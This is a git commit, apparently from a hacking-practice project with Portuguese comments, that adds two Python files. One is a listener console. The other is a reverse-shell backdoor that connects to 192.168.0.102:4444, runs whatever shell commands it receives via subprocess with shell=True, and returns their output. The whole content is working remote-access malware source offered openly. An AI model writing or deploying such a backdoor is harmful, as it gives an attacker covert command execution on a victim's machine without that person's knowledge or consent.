f1956d8928e5370395846d6a4f83ab928e259b00
tutu <arthurfaria3000@gmail.com>
2024-02-07 15:59:24 -0300

    backdoor added @todo download_method

---
+++ backdoor/listener.py
@@ -0,0 +1,49 @@
+import socket,json
+
+#serialização:
+#server: converte bytes em um objeto
+#transferencia entre cliente e servidor
+#client: converte um objeto em stream de bytes
+
+
+class Listener:
+    def __init__(self,ip,port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#Reuse socket adress
+        listener.bind((ip, port))
+        listener.listen(0)# Backlog: numero maximo de conexoes pendentes
+        self.con,addr = listener.accept()#
+        print("Conectado com: {}\n".format(addr[0]))
+
+    def serial_send(self, data):
+        json_data = json.dumps(data)
+        self.con.send(json_data.encode())
+
+    def serial_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.con.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+
+    def exec_command(self,command):
+        if ':q' == command[0]:
+            self.serial_send('exit')
+            self.con.close()
+            exit()
+        self.serial_send(command)
+        retorno = self.serial_receive()
+        return retorno
+
+    def start(self):
+        while True:
+            command = input("-$  ")
+            command = command.split(" ")
+            result = self.exec_command(command)
+            print(result)
+
+listener = Listener("192.168.0.102",4444)
+listener.start()
---
+++ backdoor/reverse_backdoor.py
@@ -0,0 +1,47 @@
+import socket, subprocess, json,os
+
+class Backdoor:
+    def __init__(self, ip, port):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((ip, port))
+
+    def serial_send(self, data):
+        json_data = json.dumps(data)
+        self.s.send(json_data.encode())
+
+    def serial_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.s.recv(1024)
+                return json.loads(json_data)
+            except ValueError: # Se o json não estiver completo
+                continue
+
+    def change_directory(self, path):
+        os.chdir(path)
+        new_directory = os.getcwd()
+        return f"[+] Mudança para {new_directory}"
+
+
+    def execute_command(self, command):
+        return (subprocess.check_output(command, shell=True)).decode('utf-8', errors = "ignore") # O comando retorna um tipo byte, por isso é necessário decodificar para string
+
+    def start(self):
+        while (1):
+            comando = self.serial_receive()
+            if comando[0] == ":q": #comando pode ser tratado como lista por vir de um json
+                self.stop()
+                break
+            elif comando[0] =="cd" and len(comando) > 1:
+                exec_result =  self.change_directory(comando[1])
+            else:
+                exec_result = self.execute_command(comando)
+            self.serial_send(exec_result)
+
+    def stop(self):
+        self.s.close()
+
+
+bckdr = Backdoor("192.168.0.102",4444)
+bckdr.start()
